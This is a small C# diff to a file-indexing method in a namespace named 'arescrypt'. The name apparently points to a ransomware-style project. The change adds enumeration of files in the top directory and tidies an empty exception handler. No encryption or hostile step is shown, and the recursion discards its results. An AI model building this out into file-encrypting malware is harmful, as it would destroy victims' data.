@@ -12,15 +12,15 @@ namespace arescrypt
             var fileIndex = new List<string> { };
             try
             {
+                foreach (string file in Directory.GetFiles(sDir)) // Search current directory
+                    fileIndex.Add(file);
                 foreach (string dir in Directory.GetDirectories(sDir))
                 {
                     foreach (string file in Directory.GetFiles(dir))
                         fileIndex.Add(file);
                     DirSearch(dir); // Search subdirectories
                 }
-            }
-            catch (Exception)
-            { }
+            } catch (Exception) { }
 
             return fileIndex;
         }
